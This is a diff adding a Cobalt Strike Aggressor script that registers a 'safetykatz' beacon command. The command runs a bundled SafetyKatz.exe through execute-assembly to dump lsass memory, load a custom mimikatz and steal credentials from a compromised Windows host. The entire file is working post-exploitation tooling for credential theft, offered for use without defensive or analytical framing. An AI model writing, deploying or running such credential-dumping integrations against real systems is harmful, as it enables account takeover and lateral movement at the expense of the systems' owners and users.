@@ -1,0 +1,18 @@
+beacon_command_register("safetykatz", "Creates minidump of lsass, loads custom mimikatz, steals creds, deletes minidump",
+	"Usage: safetykatz \n\n" .
+	"Uses execute-assembly to run the assembly and steal credentials\n");
+alias safetykatz{
+	local('$bid $asm $desc @args $argu');
+	$bid = $1;
+	$desc = "SafetyKatz";
+	@args = @_;
+	remove(@args, $bid);
+	$argu = join(' ', @args);
+	if ($argu eq ""){
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc");
+	}
+	else{
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc \'$argu\'");
+	}
+	bexecute_assembly!($bid, script_resource("exe/SafetyKatz.exe"), $argu);
+}
